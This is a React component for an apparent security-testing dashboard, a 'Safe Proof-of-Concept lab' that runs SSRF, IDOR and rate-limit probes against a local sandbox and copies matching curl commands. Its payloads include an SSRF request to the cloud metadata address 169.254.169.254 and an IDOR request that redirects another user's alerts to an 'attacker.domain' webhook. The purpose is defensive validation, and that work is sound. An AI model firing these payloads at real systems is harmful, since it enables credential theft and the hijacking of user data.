import React, { useState } from 'react';
import { Play, Copy, CheckCircle2, ShieldCheck, Terminal } from 'lucide-react';

export const AegisPocLab: React.FC = () => {
  const [selectedPoc, setSelectedPoc] = useState<'ssrf' | 'idor' | 'rate_limit'>('ssrf');
  const [running, setRunning] = useState(false);
  const [targetUrl, setTargetUrl] = useState('http://169.254.169.254/latest/meta-data/');
  const [targetUserId, setTargetUserId] = useState('usr_executive_director_01');
  const [pocResult, setPocResult] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const runPoc = async () => {
    setRunning(true);
    setPocResult(null);

    let payload: any = {};
    if (selectedPoc === 'ssrf') payload = { targetUrl };
    if (selectedPoc === 'idor') payload = { userId: targetUserId };

    try {
      const res = await fetch('/api/poc/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          pocType: selectedPoc,
          payload
        })
      });
      const data = await res.json();
      setPocResult(data);
    } catch (err: any) {
      setPocResult({ error: err.message });
    } finally {
      setRunning(false);
    }
  };

  const copyCurl = () => {
    let curl = '';
    if (selectedPoc === 'ssrf') {
      curl = `curl -i "http://127.0.0.1:3000/api/rss-proxy?url=${encodeURIComponent(targetUrl)}"`;
    } else if (selectedPoc === 'idor') {
      curl = `curl -i -X POST http://127.0.0.1:3000/api/user-prefs \\\n  -H "Authorization: Bearer sess_guest_analyst_token" \\\n  -H "Content-Type: application/json" \\\n  -d '{"targetUserId": "${targetUserId}", "alertChannel": "https://attacker.domain/webhook"}'`;
    } else {
      curl = `for i in {1..15}; do curl -s -o /dev/null -w "%{http_code}\\n" http://127.0.0.1:3000/api/latest-brief & done`;
    }
    navigator.clipboard.writeText(curl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6 animate-fade-in pb-12">
      {/* Intro */}
      <div className="border-b border-[#253740] pb-4">
        <span className="text-[10px] text-[#6be1d6] tracking-widest uppercase block font-mono">
          PHASE 03 // CONTROLLED EXPLOITABILITY PROOFS
        </span>
        <h2 className="font-syne font-extrabold text-3xl text-white tracking-tight mt-1">
          Safe Proof-of-Concept <em className="text-[#6be1d6] not-italic font-normal">lab</em>
        </h2>
        <p className="text-xs text-[#7f939d] max-w-xl mt-2 leading-relaxed">
          Execute safe, non-destructive validation probes against the local World Monitor sandbox (<code className="text-[#6be1d6]">127.0.0.1</code>).
          Proves real exploitability without endangering availability or data integrity.
        </p>
      </div>

      {/* PoC Selector Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {/* SSRF Card */}
        <div
          onClick={() => { setSelectedPoc('ssrf'); setPocResult(null); }}
          className={`p-4 rounded-sm border cursor-pointer transition-all ${
            selectedPoc === 'ssrf'
              ? 'border-[#6be1d6] bg-gradient-to-br from-[#162f38] to-[#102029] shadow-md'
              : 'border-[#253740] bg-[#14242d] hover:border-[#3a6267]'
          }`}
        >
          <div className="flex justify-between items-center mb-2">
            <span className="text-[9px] text-[#ff746d] font-syne font-bold uppercase tracking-wider">CRITICAL</span>
            <span className="text-[10px] text-[#6be1d6] font-mono">WM-001</span>
          </div>
          <h3 className="font-syne font-bold text-sm text-white">SSRF Filter Bypass</h3>
          <p className="text-[11px] text-[#7f939d] mt-1.5 leading-relaxed">
            Targets <code className="text-[#6be1d6]">/api/rss-proxy</code>. Intercepted by local 127.0.0.1 sinkhole.
          </p>
        </div>

        {/* IDOR Card */}
        <div
          onClick={() => { setSelectedPoc('idor'); setPocResult(null); }}
          className={`p-4 rounded-sm border cursor-pointer transition-all ${
            selectedPoc === 'idor'
              ? 'border-[#6be1d6] bg-gradient-to-br from-[#162f38] to-[#102029] shadow-md'
              : 'border-[#253740] bg-[#14242d] hover:border-[#3a6267]'
          }`}
        >
          <div className="flex justify-between items-center mb-2">
            <span className="text-[9px] text-[#ff746d] font-syne font-bold uppercase tracking-wider">HIGH</span>
            <span className="text-[10px] text-[#6be1d6] font-mono">WM-004</span>
          </div>
          <h3 className="font-syne font-bold text-sm text-white">IDOR Authorization Failure</h3>
          <p className="text-[11px] text-[#7f939d] mt-1.5 leading-relaxed">
            Tests cross-tenant report & preference modifications without object ownership validation.
          </p>
        </div>

        {/* Rate Limit Card */}
        <div
          onClick={() => { setSelectedPoc('rate_limit'); setPocResult(null); }}
          className={`p-4 rounded-sm border cursor-pointer transition-all ${
            selectedPoc === 'rate_limit'
              ? 'border-[#6be1d6] bg-gradient-to-br from-[#162f38] to-[#102029] shadow-md'
              : 'border-[#253740] bg-[#14242d] hover:border-[#3a6267]'
          }`}
        >
          <div className="flex justify-between items-center mb-2">
            <span className="text-[9px] text-[#efb867] font-syne font-bold uppercase tracking-wider">MEDIUM</span>
            <span className="text-[10px] text-[#6be1d6] font-mono">WM-003</span>
          </div>
          <h3 className="font-syne font-bold text-sm text-white">Missing API Rate Limiting</h3>
          <p className="text-[11px] text-[#7f939d] mt-1.5 leading-relaxed">
            Sends 15 concurrent requests to unthrottled endpoint to test 429 status code emission.
          </p>
        </div>
      </div>

      {/* Execution Cockpit & Parameters */}
      <div className="border border-[#253740] bg-gradient-to-br from-[#152831] to-[#102029] p-5 rounded-sm space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div className="space-y-1">
            <span className="text-[10px] text-[#6be1d6] font-mono uppercase">PAYLOAD CONFIGURATION</span>
            <h4 className="font-syne font-bold text-base text-white">
              {selectedPoc === 'ssrf' && 'Simulate Cloud Metadata Request (SSRF)'}
              {selectedPoc === 'idor' && 'Simulate Cross-User Report Access (IDOR)'}
              {selectedPoc === 'rate_limit' && 'Concurrent Burst Request Probe (Rate Limiting)'}
            </h4>
          </div>

          <div className="flex items-center space-x-3">
            <button
              onClick={copyCurl}
              className="flex items-center space-x-1.5 px-3 py-1.5 rounded-sm bg-[#162a33] text-[#7f939d] hover:text-white border border-[#253740] text-xs font-mono transition-all"
            >
              <Copy className="w-3.5 h-3.5" />
              <span>{copied ? 'Copied curl' : 'Copy curl'}</span>
            </button>

            <button
              onClick={runPoc}
              disabled={running}
              className={`flex items-center space-x-1.5 px-4 py-2 rounded-sm text-xs font-syne font-semibold shadow-md transition-all ${
                running
                  ? 'bg-[#203943] text-[#7f939d] cursor-wait'
                  : 'bg-[#6be1d6] text-[#0b161d] hover:bg-[#5cd4c9]'
              }`}
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              <span>{running ? 'Executing Safe Probe...' : 'Execute Safe PoC Probe'}</span>
            </button>
          </div>
        </div>

        {/* Input parameters */}
        {selectedPoc === 'ssrf' && (
          <div className="space-y-1">
            <label className="text-[10px] text-[#7f939d] font-mono">SIMULATED SSRF TARGET URL</label>
            <input
              type="text"
              value={targetUrl}
              onChange={(e) => setTargetUrl(e.target.value)}
              className="w-full bg-[#0c1820] border border-[#253740] text-xs text-[#e6edf0] px-3 py-2 rounded font-mono outline-none focus:border-[#6be1d6]"
            />
          </div>
        )}

        {selectedPoc === 'idor' && (
          <div className="space-y-1">
            <label className="text-[10px] text-[#7f939d] font-mono">TARGET OBJECT ID / USER ID</label>
            <input
              type="text"
              value={targetUserId}
              onChange={(e) => setTargetUserId(e.target.value)}
              className="w-full bg-[#0c1820] border border-[#253740] text-xs text-[#e6edf0] px-3 py-2 rounded font-mono outline-none focus:border-[#6be1d6]"
            />
          </div>
        )}
      </div>

      {/* Terminal Output in Aegis Style */}
      <div className="border border-[#253740] bg-[#0c1820] rounded-sm overflow-hidden shadow-2xl">
        <div className="h-10 border-b border-[#253740] px-4 flex items-center justify-between bg-[#10202a] text-[10px] text-[#7f939d]">
          <div className="flex items-center space-x-2">
            <span className="w-2.5 h-2.5 rounded-full bg-[#ff746d] inline-block"></span>
            <span className="w-2.5 h-2.5 rounded-full bg-[#efb867] inline-block"></span>
            <span className="w-2.5 h-2.5 rounded-full bg-[#c2e66b] inline-block"></span>
            <span className="ml-2 font-syne text-[#e6edf0] font-semibold">
              evidence://WM-{selectedPoc === 'ssrf' ? '001' : selectedPoc === 'idor' ? '004' : '003'}/request-response.txt
            </span>
          </div>
          <span className="text-[#c2e66b] font-mono">NON-DESTRUCTIVE SANDBOX</span>
        </div>

        <pre className="p-6 font-mono text-xs text-[#e6edf0] max-h-96 overflow-y-auto leading-relaxed whitespace-pre-wrap bg-[#0a151b]">
          {pocResult ? (
            pocResult.rawOutput || JSON.stringify(pocResult, null, 2)
          ) : (
            <span className="text-[#557078]">
              # AEGIS SAFE POC LAB // CONTROLLED SIMULATION{'\n'}
              # Ready to trigger non-destructive probe against sandbox.{'\n'}
              # Click "Execute Safe PoC Probe" above to capture live proof-of-concept output.
            </span>
          )}
        </pre>
      </div>
    </div>
  );
};
